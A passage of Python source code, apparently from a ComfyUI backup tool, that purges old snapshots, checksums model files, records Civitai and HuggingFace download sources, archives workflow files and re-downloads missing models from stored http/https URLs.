def delete_snapshot(snapshot_path: str | Path) -> bool:
    try:
        Path(snapshot_path).unlink()
        return True
    except Exception:
        return False


def purge_old_snapshots(keep: int = 10) -> int:
    """Delete oldest snapshots, keeping the N most recent. Returns count deleted."""
    # Clamp to a minimum of 1 so that keep=0 (e.g. from a bad config value)
    # never wipes ALL snapshots in a single automated backup run.
    keep = max(1, int(keep)) if keep is not None else 1
    snaps = list_snapshots()
    to_delete = snaps[keep:]
    for s in to_delete:
        delete_snapshot(s["file"])
    return len(to_delete)


# ---------------------------------------------------------------------------
# Model checksum helpers
# ---------------------------------------------------------------------------

def _sha256_file(path: Path) -> str:
    """Streaming SHA-256 of a file using 8 MB chunks."""
    import hashlib
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            chunk = f.read(8 * 1024 * 1024)
            if not chunk:
                break
            h.update(chunk)
    return h.hexdigest()


def compute_model_checksums(
    comfyui_root: Path | str,
    progress_cb: Any | None = None,
) -> dict[str, str]:
    """
    Compute SHA-256 checksums for all model files under comfyui_root/models/.

    progress_cb(current, total, filename) — optional callback for progress updates.
    Returns {relative_path: sha256_hex}.  Can be slow for large collections.
    """
    from .model_scanner import scan_models
    root = Path(comfyui_root)
    result = scan_models(root)
    all_files: list[Path] = [
        f.path
        for files in result.by_category.values()
        for f in files
    ]
    checksums: dict[str, str] = {}
    for i, p in enumerate(all_files):
        if progress_cb:
            progress_cb(i, len(all_files), p.name)
        try:
            rel = str(p.relative_to(root))
            checksums[rel] = _sha256_file(p)
        except Exception:
            pass
    return checksums


def verify_model_checksums(
    snapshot_path: str | Path,
    comfyui_root: Path | str,
) -> dict[str, str]:
    """Compare SHA-256 checksums stored in a snapshot against current files on disk.

    Returns dict keyed by relative path with values:
      "ok"       — hash matches
      "changed"  — hash mismatch (file modified or replaced)
      "missing"  — file was in snapshot but not on disk
      "new"      — file on disk but not in snapshot
    Returns {"_error": ...} if the snapshot has no checksum data.

    NOTE: This function has no CLI entry point yet.  To surface it, add a
    ``--verify-checksums <snapshot>`` flag to cli.py that calls this and
    prints the result table.
    """
    root = Path(comfyui_root)
    try:
        data = _coerce_snap(json.loads(Path(snapshot_path).read_text(encoding="utf-8")))
    except Exception as e:
        return {"_error": f"Could not read snapshot: {e}"}
    stored: dict[str, str] = data.get("model_checksums", {})
    if not stored:
        return {"_error": "no checksums in this snapshot — re-run with --checksums to populate"}
    current = compute_model_checksums(root)
    result: dict[str, str] = {}
    for key in set(stored) | set(current):
        if key in stored and key in current:
            result[key] = "ok" if stored[key] == current[key] else "changed"
        elif key in stored:
            result[key] = "missing"
        else:
            result[key] = "new"
    return result


# ---------------------------------------------------------------------------
# Model source URL tracking (Civitai / HuggingFace sidecars)
# ---------------------------------------------------------------------------

def _collect_model_sources(comfyui_root: Path) -> dict[str, Any]:
    """
    Scan for Civitai .civitai.info and generic .info sidecar files alongside model files.

    Returns {relative_model_path: {source, url, model_id, version_id, ...}}.
    Uses forward-slash separators in keys on all platforms for portability.
    """
    from .model_scanner import MODEL_EXTENSIONS
    models_dir = comfyui_root / "models"
    if not models_dir.exists():
        return {}
    sources: dict[str, Any] = {}

    # ── Civitai sidecars (.civitai.info) ───────────────────────────────────
    # Outer try catches PermissionError raised by the rglob generator itself
    # (when it tries to enter a restricted subdirectory); inner try catches
    # per-file read / parse errors.
    try:
        for info_file in models_dir.rglob("*.civitai.info"):
            try:
                info = json.loads(info_file.read_text(encoding="utf-8"))
                stem = info_file.name[: -len(".civitai.info")]
                for ext in MODEL_EXTENSIONS:
                    model_path = info_file.parent / (stem + ext)
                    if model_path.exists():
                        rel = model_path.relative_to(comfyui_root).as_posix()
                        entry: dict[str, Any] = {"source": "civitai"}
                        if "downloadUrl" in info:
                            entry["url"] = info["downloadUrl"]
                        if "modelId" in info:
                            entry["model_id"] = info["modelId"]
                        if "id" in info:
                            entry["version_id"] = info["id"]
                        if isinstance(info.get("model"), dict) and "name" in info["model"]:
                            entry["model_name"] = info["model"]["name"]
                        if "name" in info:
                            entry["version_name"] = info["name"]
                        sources[rel] = entry
                        break
            except Exception:
                pass
    except (PermissionError, OSError):
        pass

    # ── Generic .info sidecars (ComfyUI Manager format) ────────────────────
    try:
        for info_file in models_dir.rglob("*.info"):
            if info_file.name.endswith(".civitai.info"):
                continue  # already handled above
            try:
                info = json.loads(info_file.read_text(encoding="utf-8"))
                stem = info_file.stem
                for ext in MODEL_EXTENSIONS:
                    model_path = info_file.parent / (stem + ext)
                    if model_path.exists():
                        rel = model_path.relative_to(comfyui_root).as_posix()
                        if rel in sources:
                            break  # civitai data takes precedence
                        url = info.get("download_url") or info.get("url") or ""
                        if url:
                            entry = {"url": url}
                            if "huggingface.co" in url:
                                entry["source"] = "huggingface"
                            elif "civitai.com" in url:
                                entry["source"] = "civitai"
                            else:
                                entry["source"] = "unknown"
                            sources[rel] = entry
                        break
            except Exception:
                pass
    except (PermissionError, OSError):
        pass

    return sources


# ---------------------------------------------------------------------------
# Workflow snapshotting
# ---------------------------------------------------------------------------

def create_workflow_snapshot(
    comfyui_root: Path | str,
    note: str = "",
) -> Path | None:
    """
    Create a zip archive of all workflow JSON files in the ComfyUI installation.

    Scans: user/default/workflows/ and workflows/ (whichever exist).
    Returns the path to the created zip, or None if no workflows were found.
    """
    import zipfile
    root = Path(comfyui_root)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M")
    install_name = re.sub(r"[^\w.\-]", "_", root.resolve().name).strip("_")
    out_path = _backup_dir() / f"workflows_{install_name}_{ts}.zip"

    workflow_dirs: list[Path] = []
    for rel in ["user/default/workflows", "workflows"]:
        d = root / rel
        if d.exists() and d.is_dir():
            workflow_dirs.append(d)

    if not workflow_dirs:
        return None

    import zipfile as _zf
    written = 0
    with _zf.ZipFile(out_path, "w", _zf.ZIP_DEFLATED) as zf:
        zf.writestr("_meta.json", json.dumps({
            "timestamp": ts,
            "comfyui_root": str(root),
            "note": note,
            "type": "workflow_snapshot",
        }, indent=2))
        if note:
            zf.writestr("_note.txt", note)
        for wdir in workflow_dirs:
            try:
                wf_list = sorted(wdir.rglob("*.json"))
            except (PermissionError, OSError):
                wf_list = []
            for wf in wf_list:
                try:
                    arcname = wf.relative_to(root).as_posix()
                    zf.write(wf, arcname)
                    written += 1
                except Exception:
                    pass

    if written == 0:
        out_path.unlink(missing_ok=True)
        return None

    return out_path


def list_workflow_snapshots() -> list[dict[str, Any]]:
    """Return all workflow snapshot zips, newest first."""
    bd = _backup_dir()
    results: list[dict[str, Any]] = []
    try:
        zip_candidates = sorted(bd.glob("workflows_*.zip"), reverse=True)
    except (PermissionError, OSError):
        return results
    for f in zip_candidates:
        try:
            import zipfile as _zf
            with _zf.ZipFile(f, "r") as zf:
                if "_meta.json" in zf.namelist():
                    meta = json.loads(zf.read("_meta.json").decode("utf-8"))
                    meta["file"] = str(f)
                    meta["workflow_count"] = sum(
                        1 for n in zf.namelist()
                        if n.endswith(".json") and not n.startswith("_")
                    )
                    results.append(meta)
        except Exception:
            pass
    return results


# ---------------------------------------------------------------------------
# Missing model detection + re-download
# ---------------------------------------------------------------------------

def list_missing_models(
    snapshot_path: str | Path,
    comfyui_root: Path | str,
) -> list[dict[str, Any]]:
    """
    Compare models listed in a snapshot against files currently on disk.

    Returns a list of dicts for each model that was in the snapshot but is
    no longer present on disk:
      {"category": "checkpoints", "name": "flux1-dev.safetensors",
       "size_gb": 12.0, "path": Path(...)}
    """
    root = Path(comfyui_root)
    try:
        data = _coerce_snap(json.loads(Path(snapshot_path).read_text(encoding="utf-8")))
    except Exception as e:
        raise ValueError(f"Could not read snapshot '{snapshot_path}': {e}") from e
    # _coerce_snap guarantees models.categories is a dict and each cat's files is a
    # list of dicts, so no AttributeError can arise from malformed content here.
    categories: dict[str, Any] = data.get("models", {}).get("categories", {})
    missing: list[dict[str, Any]] = []
    for cat, cat_data in categories.items():
        for f in cat_data.get("files", []):
            name = f.get("name", "")
            if not name:
                continue
            # Prefer the stored relative path (added in newer snapshots) because
            # the category key is the human-readable label ("Checkpoint") not the
            # real directory name ("checkpoints").  Old snapshots without rel_path
            # fall back to the label-based guess, which is wrong for standard installs
            # but is the best we can do without the stored path.
            rel = f.get("rel_path", "")
            if rel:
                expected = root / rel
            else:
                expected = root / "models" / cat / name
            if not expected.exists():
                entry = {
                    "category": cat,
                    "name": name,
                    "size_gb": f.get("size_gb", 0.0),
                    "path": expected,
                }
                if rel:
                    entry["rel_path"] = rel
                missing.append(entry)
    return missing


def restore_models(
    snapshot_path: str | Path,
    comfyui_root: Path | str,
    dry_run: bool = False,
) -> tuple[bool, list[str]]:
    """
    Attempt to re-download models that are in a snapshot but missing from disk.

    Uses source URL metadata stored in the snapshot's model_sources section.
    Only models with a known download URL can be recovered automatically.

    Returns (overall_ok, messages).
    """
    import urllib.request
    root = Path(comfyui_root)
    snap = Path(snapshot_path)
    try:
        data = _coerce_snap(json.loads(snap.read_text(encoding="utf-8")))
    except Exception as e:
        return False, [f"Could not read snapshot '{snap}': {e}"]
    try:
        missing = list_missing_models(snap, root)
    except (ValueError, Exception) as e:
        return False, [f"Could not determine missing models: {e}"]
    # _coerce_snap guarantees model_sources is a dict
    sources: dict[str, Any] = data.get("model_sources", {})

    if not missing:
        return True, ["No missing models — nothing to restore."]

    recoverable: list[dict[str, Any]] = []
    unrecoverable: list[dict[str, Any]] = []
    for m in missing:
        # model_sources keys are posix-style relative paths from comfyui_root.
        # Prefer the stored rel_path (new snapshots); fall back to the label-based
        # guess for old snapshots (will usually miss, but is the best we can do).
        rel_posix = m.get("rel_path") or f"models/{m['category']}/{m['name']}"
        src = sources.get(rel_posix, {})
        # _safe_download_url accepts only http/https — rejects file://, javascript:,
        # data:, and other schemes that could copy local files or cause unexpected
        # behaviour via urlretrieve.
        url = _safe_download_url(src.get("url", ""))
        if url:
            recoverable.append({**m, "url": url, "source": src.get("source", "unknown")})
        else:
            unrecoverable.append(m)

    messages: list[str] = []
    if unrecoverable:
        messages.append(
            f"[yellow]{len(unrecoverable)} model(s) have no source URL and cannot be recovered automatically:[/yellow]"
        )
        for m in unrecoverable:
            messages.append(f"  [dim]{m['category']}/{m['name']}  ({m['size_gb']:.1f} GB)[/dim]")
        messages.append("")

    if not recoverable:
        return False, messages + ["[red]No models with known download URLs found.[/red]"]

    verb = "[DRY RUN] Would download" if dry_run else "Downloading"
    messages.append(f"{verb} {len(recoverable)} model(s):")
    ok = True
    for m in recoverable:
        size_str = f" ({m['size_gb']:.1f} GB)" if m["size_gb"] else ""
        messages.append(f"  {m['category']}/{m['name']}{size_str}  [{m['source']}]")
        if dry_run:
            continue
        dest: Path = m["path"]
        dest.parent.mkdir(parents=True, exist_ok=True)
        try:
            import socket as _socket
            _prev_timeout = _socket.getdefaulttimeout()
            try:
                _socket.setdefaulttimeout(300)  # 5-minute cap per file
                urllib.request.urlretrieve(m["url"], dest)
            finally:
                _socket.setdefaulttimeout(_prev_timeout)
            messages.append(f"    [green]✓ saved to {dest}[/green]")
        except Exception as e:
            messages.append(f"    [red]✗ download failed: {e}[/red]")
            ok = False

    return ok or dry_run, messages
